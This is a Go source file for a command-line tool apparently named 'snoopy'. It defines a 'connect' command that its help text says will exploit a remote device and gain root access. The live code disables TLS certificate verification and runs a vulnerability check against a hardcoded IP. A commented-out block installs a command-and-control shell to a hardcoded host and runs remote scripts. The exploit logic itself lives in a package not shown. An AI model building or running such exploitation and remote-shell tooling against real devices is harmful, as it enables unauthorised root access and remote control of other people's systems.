package cmd

import (
	"crypto/tls"
	"fmt"
	"github.com/spf13/cobra"
	"net/http"
	"snoopy/exploit"
)

var connectCmd = &cobra.Command{
	Use:   "connect <IP> [PORT]",
	Short: "exploit remote device",
	Long:  "exploit a remove device and gain root access",
	Args:  cobra.RangeArgs(1, 2),
	RunE:  connect,
}

func init() {
	rootCmd.AddCommand(connectCmd)
}

func connect(cmd *cobra.Command, args []string) error {
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}

	version, err := exploit.CheckIfVulnerable("10.0.0.10", 443, true, client)
	if err != nil {
		return err
	}

	fmt.Println(version)

	return nil

	//shell, _ := c2.New(
	//	"192.168.1.247",
	//	c2.WithEncoder(&encoders.Simple{}),
	//)
	//
	//_ = shell.Install()
	//
	//script := "dir /w"
	//result, err := shell.DoScript(&script)
	//if err != nil {
	//	return err
	//}
	//
	//fmt.Println(result)
	//
	//shell.Shutdown()
	//
	//return nil
	//return terminal.Run("http", args[0], 10000)
}
